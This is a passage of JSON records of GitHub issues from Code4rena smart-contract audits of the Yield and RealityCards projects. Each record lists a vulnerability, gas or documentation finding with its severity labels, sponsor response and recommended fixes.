transfer and return `false` are still counted as a correct transfer and tokens that don't correctly implement the latest EIP20 spec, like USDT, will be unusable in the protocol as they revert the transaction because of the missing return value.  ## Recommended Mitigation Steps We recommend using OpenZeppelin\u2019s `SafeERC20` versions with the `safeTransfer` and `safeTransferFrom` functions that handle the return value check as well as non-standard-compliant tokens.   "}, {"title": "ERC20Rewards claiming can fail if no reward tokens", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/30", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "ERC20Rewards claiming can fail if no reward tokens"}, {"title": "ERC20Rewards breaks when setting a different token", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/29", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "# Handle  cmichel   # Vulnerability details  The `setRewards` function allows setting a different token. Holders of a previous reward period cannot all be paid out and will receive **their old reward amount** in the new token.  This leads to issues when the new token is more (less) valuable, or uses different decimals.  **Example:** Assume the first reward period paid out in `DAI` which has 18 decimals. Someone would have received `1.0 DAI = 1e18 DAI` if they called `claim` now. Instead, they wait until the new period starts with `USDC` (using only 6 decimals) and can `claim` their `1e18` reward amount in USDC which would equal `1e12 USDC`, one trillion USD.  ## Impact Changing the reward token only works if old and new tokens use the same decimals and have the exact same value. Otherwise, users that claim too late/early will lose out.  ## Recommended Mitigation Steps Disallow changing the reward token, or clear user's pending rewards of the old token. The second approach requires more code changes and keeping track of what token a user last claimed.  "}, {"title": "ERC20Rewards returns wrong rewards if no tokens initially exist", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/28", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "# Handle  cmichel   # Vulnerability details  The `ERC20Rewards._updateRewardsPerToken` function exits without updating `rewardsPerToken_.lastUpdated` if `totalSupply` is zero, i.e., if there are no tokens initially.  This leads to an error if there is an active rewards period but not tokens have been minted yet.  **Example:** `rewardsPeriod.start: 1 month ago`, `rewardsPeriod.end: in 1 month`, `totalSupply == 0`. The first mint leads to the user (mintee) receiving all rewards for the past period (50% of the total rewards in this case). - `_mint` is called, calls `_updateRewardsPerToken` which short-circuits. `rewardsPerToken.lastUpdated` is still set to `rewardsPeriod.start` from the constructor. Then `_updateUserRewards` is called and does not currently yield any rewards. (because both balance and the index diff are zero). User is now minted the tokens, `totalSupply` increases and user balance is set. - User performs a `claim`: `_updateRewardsPerToken` is called and `timeSinceLastUpdated = end - rewardsPerToken_.lastUpdated = block.timestamp - rewardsPeriod.start = 1 month`. Contract \"issues\" rewards for the past month. The first mintee receives all of it.  ## Impact The first mintee receives all pending rewards when they should not receive any past rewards. This can easily happen if the token is new, the reward period has already been initialized and is running, but the protocol has not officially launched yet. Note that `setRewards` also allows setting a date in the past which would also be fatal in this case.  ## Recommended Mitigation Steps The `rewardsPerToken_.lastUpdated` field must always be updated in `_updateRewardsPerToken` to the current time (or `end`) even if `_totalSupply == 0`. Don't return early.  "}, {"title": "TimeLock cannot schedule the same calls multiple times", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/27", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "Timelock"], "target": "2021-08-yield-findings", "body": "# Handle  cmichel   # Vulnerability details  The `TimeLock.schedule` function reverts if the same `targets` and `data` fields are used as the `txHash` will be the same. This means one cannot schedule the same transactions multiple times.  ## Impact Imagine the delay is set to 30 days, but a contractor needs to be paid every 2 weeks. One needs to wait 30 days before scheduling the second payment to them.  ## Recommended Mitigation Steps Also include `eta` in the hash. (Compound's Timelock does it as well.) This way the same transaction data can be used by specifying a different `eta`.   "}, {"title": "CompositeMultiOracle returns wrong decimals for prices?", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/26", "labels": ["bug", "3 (High Risk)", "Oracles"], "target": "2021-08-yield-findings", "body": "CompositeMultiOracle returns wrong decimals for prices?"}, {"title": "The `Strategy.Divest` event is not fired", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/25", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "Strategy"], "target": "2021-08-yield-findings", "body": "# Handle  cmichel   # Vulnerability details  The `Strategy.Divest` event is not fired.  ## Impact Off-chain scripts that rely on this event won't work.  ## Recommended Mitigation Steps Emit this event in `endPool`.  "}, {"title": "The `Strategy.Invest` event is not fired", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/24", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "Strategy"], "target": "2021-08-yield-findings", "body": "# Handle  cmichel   # Vulnerability details  The `Strategy.Invest` event is not fired.  ## Impact Off-chain scripts that rely on this event won't work.  ## Recommended Mitigation Steps Emit this event in `startPool`.  "}, {"title": "`_peek` does not work for tokens with > 18 decimals", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/23", "labels": ["bug", "1 (Low Risk)", "Oracles"], "target": "2021-08-yield-findings", "body": "`_peek` does not work for tokens with > 18 decimals"}, {"title": "Missing parameter validation", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/22", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-yield-findings", "body": "Missing parameter validation"}, {"title": "EmergencyBrake.sol: Permissions cannot be re-planned after termination", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/21", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "EmergencyBrake"], "target": "2021-08-yield-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  Given a configuration of target, contacts and permissions, calling `terminate()` will permanently prevent this configuration from being used again because the state becomes `State.TERMINATED`. All other functions require the configuration to be in the other states (UNKNOWN, PLANNED, or EXECUTED).  In other words, the removal of the restoring option for the configuration through `EmergencyBrake` is permanent.  ### Recommended Mitigation Steps  Since `EmergencyBrake` cannot reinstate permissions after termination, it would be better to have terminate change its state to UNKNOWN. The TERMINATED state can therefore be removed.  "}, {"title": "Unchecked return value from transfer()", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/20", "labels": ["bug", "duplicate", "2 (Med Risk)", "ERC20Rewards"], "target": "2021-08-yield-findings", "body": "Unchecked return value from transfer()"}, {"title": "Incorrect type of uint parameter is used in event ", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/19", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-yield-findings", "body": "Incorrect type of uint parameter is used in event "}, {"title": "Different definition of beforeMaturity() and afterMaturity() modifier in different file", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/18", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "Strategy"], "target": "2021-08-yield-findings", "body": "Different definition of beforeMaturity() and afterMaturity() modifier in different file"}, {"title": "Floating Pragma", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/17", "labels": ["bug", "duplicate", "0 (Non-critical)", "sponsor disputed"], "target": "2021-08-yield-findings", "body": "Floating Pragma"}, {"title": "CompositeMultiOracle.sol - bases.length in setSources() and setPaths() can be stored in a variable", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/16", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "Oracles"], "target": "2021-08-yield-findings", "body": "# Handle  PierrickGT   # Vulnerability details  ## Impact In the external functions `setSources` and `setPaths` of `CompositeMultiOracle.sol`, we call `bases.length` three times. This value can be stored in a variable to avoid two sload.  Also, `uint256 i = 0;` can be refactored to `uint256 i;` since `uint256` initializes with a value of `0` by default.  ## Proof of Concept https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L39-L46  https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L60-L67  ## Recommended Mitigation Steps Store `bases.length` in a variable and declare `i` with the default value: ``` uint256 basesLength = bases.length;  require(     basesLength == quotes.length &&      basesLength == sources_.length,     \"Mismatched inputs\" );  for (uint256 i; i < basesLength; i++) {     _setSource(bases[i], quotes[i], sources_[i]); } ``` ``` uint256 basesLength = bases.length;  require(     basesLength == quotes.length &&      basesLength == paths_.length,     \"Mismatched inputs\" );  for (uint256 i; i < basesLength; i++) {     _setPath(bases[i], quotes[i], paths_[i]); } ```  "}, {"title": "CompositeMultiOracle.sol - Add natspec documentation", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/15", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed", "Oracles"], "target": "2021-08-yield-findings", "body": "# Handle  PierrickGT   # Vulnerability details  ## Impact In `CompositeMultiOracle.sol`, internal functions, event, struct, public constant and mapping are not documented.  Functions parameters and return values should also be documented for external functions.  Natspec documentation should also be added to describe what this contract is all about.  ## Proof of Concept https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L79-L81  https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L97-L99  ## Recommended Mitigation Steps Add natspec documentation to describe the contract and not just his title: - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L11-L12  Add natspec documentation for the following code: - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L15 - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L17-L18 - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L20 - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L25-L26 - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L110 - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L120 - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L130 - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L140  Add natspec documentation for parameters and return value of these functions: - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L31 - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L38 - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L52 - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L59 - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L74 - https://github.com/code-423n4/2021-08-yield/blob/e4227756bd2b74d683525d61f0636bed64325955/contracts/oracles/composite/CompositeMultiOracle.sol#L94  "}, {"title": "CTokenMultiOracle.sol - cTokenIds.length in setSources() can be stored in a variable", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "Oracles"], "target": "2021-08-yield-findings", "body": "# Handle  PierrickGT   # Vulnerability details  ## Impact In the external function `setSources` of `CTokenMultiOracle.sol`, we call `cTokenIds.length` three times. This value can be stored in a variable to avoid two sload.  Also, `uint256 i = 0;` can be refactored to `uint256 i;` since `uint256` initializes with a value of `0` by default.  ## Proof of Concept https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L38-L39  https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L42  ## Recommended Mitigation Steps Store `cTokenIds.length` in a variable and declare `i` with the default value: ``` uint256 cTokenIdsLength = cTokenIds.length;  require(     cTokenIdsLength == underlyings.length &&     cTokenIdsLength == cTokens.length,     \"Mismatched inputs\" );  for (uint256 i; i < cTokenIdsLength; i++) {     _setSource(cTokenIds[i], underlyings[i], cTokens[i]); } ```  "}, {"title": "CTokenMultiOracle.sol - require in _setSource() seems useless", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/12", "labels": ["bug", "0 (Non-critical)", "Oracles"], "target": "2021-08-yield-findings", "body": "CTokenMultiOracle.sol - require in _setSource() seems useless"}, {"title": "CTokenMultiOracle.sol - Add natspec documentation", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/11", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed", "Oracles"], "target": "2021-08-yield-findings", "body": "# Handle  PierrickGT   # Vulnerability details  # CTokenMultiOracle.sol - Add natspec documentation  ## Impact In `CTokenMultiOracle.sol`, internal functions, event, struct, public constant and mapping are not documented.  Functions parameters and return values should also be documented for external functions.  Natspec documentation should also be added to describe what this contract is all about.  ## Recommended Mitigation Steps Add natspec documentation to describe the contract: - https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L11  Add natspec documentation for the following code: - https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L14 - https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L16 - https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L18 - https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L24 - https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L73 - https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L91 - https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L109  Add natspec documentation for parameters and return value of these functions: - https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L29 - https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L36 - https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L51 - https://github.com/code-423n4/2021-08-yield/blob/1383f6a715657547603cddd0fed824cde631c7db/contracts/oracles/compound/CTokenMultiOracle.sol#L64   "}, {"title": "FYTokenFactory.sol - fyToken.ROOT() can be stored in a variable", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/10", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-08-yield-findings", "body": "# Handle  PierrickGT   # Vulnerability details  ## Impact In `FYTokenFactory.sol`, it is possible to avoid one sload by storing `fyToken.ROOT()` in a variable.  ## Proof of Concept https://github.com/code-423n4/2021-08-yield/blob/77bc292601ba6cb6d35f9a1cb606f21ed94ad36e/contracts/FYTokenFactory.sol#L37-L38  ## Tools Used Manual analysis  ## Recommended Mitigation Steps ```   bytes4 rootRole = fyToken.ROOT();    fyToken.grantRole(rootRole, msg.sender);   fyToken.renounceRole(rootRole, address(this)); ```  "}, {"title": "improve safety of role constants ", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/9", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "Wand"], "target": "2021-08-yield-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The contract Wand defines a few role constants with bytes4(keccak256(\"...function...\")) However if the function template would change slightly, for example when uint128 is replaced by uint256, then this construction isn't valid anymore.  It is safer the use the function selector, as is done in EmergencyBrake.sol  ## Proof of Concept https://github.com/code-423n4/2021-08-yield/blob/main/contracts/Wand.sol#L27      bytes4 public constant JOIN = bytes4(keccak256(\"join(address,uint128)\"));     bytes4 public constant EXIT = bytes4(keccak256(\"exit(address,uint128)\"));     bytes4 public constant MINT = bytes4(keccak256(\"mint(address,uint256)\"));     bytes4 public constant BURN = bytes4(keccak256(\"burn(address,uint256)\"));  https://github.com/code-423n4/2021-08-yield/blob/main/contracts/utils/EmergencyBrake.sol#L35   _grantRole(IEmergencyBrake.plan.selector, planner);  ## Tools Used  ## Recommended Mitigation Steps Use function selectors in Wand.sol   "}, {"title": "updateTime of get is 0", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/7", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "Oracles"], "target": "2021-08-yield-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact In function get of CompositeMultiOracle the updateTime is not initialized, so it will be 0  Function _get has the following statement:    updateTimeOut = (updateTimeOut < updateTimeIn) ? updateTimeOut : updateTimeIn;      updateTimeIn ==0 ==>  (updateTimeOut < updateTimeIn)== false ==> result of the expression is updateTimeIn == 0 ==> updateTimeOut =0  So this means the function get will always return updateTime==0  The updateTime result of the function get doesn't seem to be used in the code so the risk is low. If would only be relevant for future code updates.   ## Proof of Concept //https://github.com/code-423n4/2021-08-yield/blob/main/contracts/oracles/composite/CompositeMultiOracle.sol#L94  function get(bytes32 base, bytes32 quote, uint256 amount)  external virtual override  returns (uint256 value, uint256 updateTime)  { ...         for (uint256 p = 0; p < path.length; p++) {             (price, updateTime) = _get(base_, path[p], price, updateTime);  function _get(bytes6 base, bytes6 quote, uint256 priceIn, uint256 updateTimeIn)  private returns (uint priceOut, uint updateTimeOut) {     ...         (priceOut, updateTimeOut) = IOracle(source.source).get(base, quote, 10 ** source.decimals);    // Get price for one unit       ...         updateTimeOut = (updateTimeOut < updateTimeIn) ? updateTimeOut : updateTimeIn;                 // Take the oldest update time     }  ## Tools Used  ## Recommended Mitigation Steps In function get, add the following in the beginning of the function: updateTime = block.timestamp;  "}, {"title": "Combine get and peek", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/6", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed", "Oracles"], "target": "2021-08-yield-findings", "body": "Combine get and peek"}, {"title": "gas improvement wih source.decimals", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/5", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "Oracles"], "target": "2021-08-yield-findings", "body": "gas improvement wih source.decimals"}, {"title": "improve separation of concerns in TimeLock", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/4", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-08-yield-findings", "body": "improve separation of concerns in TimeLock"}, {"title": "gas improvement in schedule and cancel of TimeLock.sol", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/3", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "Timelock"], "target": "2021-08-yield-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The functions schedule and cancel of TimeLock.sol receive the parameters targets and data. This is not absolutely necessary. Receiving txHash would be enough, as txHash is verified in the function execute. This is like a commit and reveal scheme. It would save some gas and contract complexity.  This assumes that the parameters  targets and data are accessible offchain for verification, which I would think would be true anyway.  ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.  ## Tools Used  ## Recommended Mitigation Steps You can use the following approach if you want to save some gas. Note: the parameters targets and data won't be available onchain in events (at least until execute has been performed)   function schedule(bytes32 txHash, uint256 eta) external override auth {         require(eta >= block.timestamp + delay, \"Must satisfy delay.\"); // This also prevents setting eta = 0 and messing up the state                 require(transactions[txHash] == 0, \"Transaction not unknown.\");         transactions[txHash] = eta;                ....     }      function cancel(bytes32 txHash) external override auth {         require(transactions[txHash] != 0, \"Transaction hasn't been scheduled.\");         delete transactions[txHash];        ....     }  "}, {"title": "extra checks separation of concerns", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/2", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-08-yield-findings", "body": "extra checks separation of concerns"}, {"title": "double negative in comment", "html_url": "https://github.com/code-423n4/2021-08-yield-findings/issues/1", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed", "Timelock"], "target": "2021-08-yield-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact TimeLock.sol contains a comment with a double negative, which is confusing to read: Transaction not unknown.  ## Proof of Concept //https://github.com/code-423n4/2021-08-yield/blob/main/contracts/utils/TimeLock.sol#L55  function schedule(address[] calldata targets, bytes[] calldata data, uint256 eta)   external override auth returns (bytes32 txHash)  { ..         require(transactions[txHash] == 0, \"Transaction not unknown.\");  ## Tools Used  ## Recommended Mitigation Steps Replace: Transaction not unknown. with: Transaction already scheduled.  "}, {"title": "UberOwner has too much power", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/74", "labels": ["bug", "sponsor disputed", "3 (High Risk)"], "target": "2021-08-realitycards-findings", "body": "UberOwner has too much power"}, {"title": "Gas optimization in RCMarket.sol and other files", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/72", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-08-realitycards-findings", "body": "Gas optimization in RCMarket.sol and other files"}, {"title": "User can deposit more than maxContractBalance", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/71", "labels": ["bug", "sponsor disputed", "0 (Non-critical)"], "target": "2021-08-realitycards-findings", "body": "User can deposit more than maxContractBalance"}, {"title": "gas saving in `_processRentCollection`", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/68", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "Resolved"], "target": "2021-08-realitycards-findings", "body": "# Handle  0xsanson   # Vulnerability details  ## Impact In `rcMarket._processRentCollection` it's possible to save a SLOAD by rewriting the lines: ``` uint256 _rentOwed = (card[_card].cardPrice *     (_timeOfCollection - card[_card].timeLastCollected)) / 1 days; uint256 _timeHeldToIncrement = (_timeOfCollection -                    card[_card].timeLastCollected); ``` into: ``` uint256 _timeHeldToIncrement = (_timeOfCollection -                    card[_card].timeLastCollected); uint256 _rentOwed = (card[_card].cardPrice * _timeHeldToIncrement) / 1 days; ```  ## Proof of Concept https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCMarket.sol#L1060-L1063  ## Tools Used editor  ## Recommended Mitigation Steps Consider changing the code as illustrated.  "}, {"title": "Use `_safeTransfer` when transferring NFTs", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/65", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-08-realitycards-findings", "body": "Use `_safeTransfer` when transferring NFTs"}, {"title": "Return value of `erc20.approve` is unchecked", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/64", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-08-realitycards-findings", "body": "Return value of `erc20.approve` is unchecked"}, {"title": "Direct usage of `ecrecover` allows signature malleability", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/63", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-08-realitycards-findings", "body": "# Handle  shw   # Vulnerability details  ## Impact  The `verifySig` function of `Gravity` calls the Solidity `ecrecover` function directly to verify the given signatures. However, the `ecrecover` EVM opcode allows malleable (non-unique) signatures and thus is susceptible to replay attacks.  Although a replay attack seems not possible here since the nonce is increased each time, ensuring the signatures are not malleable is considered a best practice (and so is checking `_signer != address(0)`, where `address(0)` means an invalid signature).  ## Proof of Concept  Referenced code: [Gravity.sol#L153](https://github.com/althea-net/cosmos-gravity-bridge/blob/92d0e12cea813305e6472851beeb80bd2eaf858d/solidity/contracts/Gravity.sol#L153)  [SWC-117: Signature Malleability](https://swcregistry.io/docs/SWC-117) [SWC-121: Missing Protection against Signature Replay Attacks](https://swcregistry.io/docs/SWC-121)  ## Recommended Mitigation Steps  Use the `recover` function from [OpenZeppelin's ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol) for signature verification.  "}, {"title": "Unable to Recover Improperly Transferred Tokens", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/62", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-08-realitycards-findings", "body": "Unable to Recover Improperly Transferred Tokens"}, {"title": "add zero address validation in constructor", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/61", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "Resolved"], "target": "2021-08-realitycards-findings", "body": "# Handle  JMukesh   # Vulnerability details  ## Impact since the parameter in the constructor are used to initialize the state variable , proper check up should be done , other wise error in these state variable  can lead to redeployment of contract  ## Proof of Concept  https://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCLeaderboard.sol#L50  https://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCOrderbook.sol#L136  https://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCTreasury.sol#L120  ## Tools Used manual review  ## Recommended Mitigation Steps add zero address validation  "}, {"title": "use of array without checking its length", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/60", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-08-realitycards-findings", "body": "use of array without checking its length"}, {"title": "Deposits don't work with fee-on transfer tokens", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/58", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-08-realitycards-findings", "body": "Deposits don't work with fee-on transfer tokens"}, {"title": "`RCLeaderboard.market` storage variable is not used", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/55", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-08-realitycards-findings", "body": "# Handle  cmichel   # Vulnerability details  The `RCLeaderboard.market` storage variable is never used. Instead, the `MARKET` role seems to be used to implement authentication.  ## Impact Unused code can hint at programming or architectural errors.  ## Recommended Mitigation Steps Use it or remove it.  "}, {"title": "Markets can start in the past", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/54", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-08-realitycards-findings", "body": "Markets can start in the past"}, {"title": "No check for the referenceContractAddress in createMarket()", "html_url": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/50", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed", "Resolved"], "target": "2021-08-realitycards-findings", "body": "# Handle  JMukesh   # Vulnerability details  ## Impact   referenceContractAddress  is used in createMarket() to create newAddress  for the market , a necessary check should be there that referenceContractAddress exist or not, because if createMarket() is called before setReferenceContractAddress() address(0) will be passed as referenceContractAddress , since addMarket() of treasury and nfthub does not have address validation for the market  ## Proof of Concept https://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCFactory.sol#L714  ## Tools Used  manual review  ## Recommended Mitigation Steps  add a condition to check the referenceContractAddress  "}]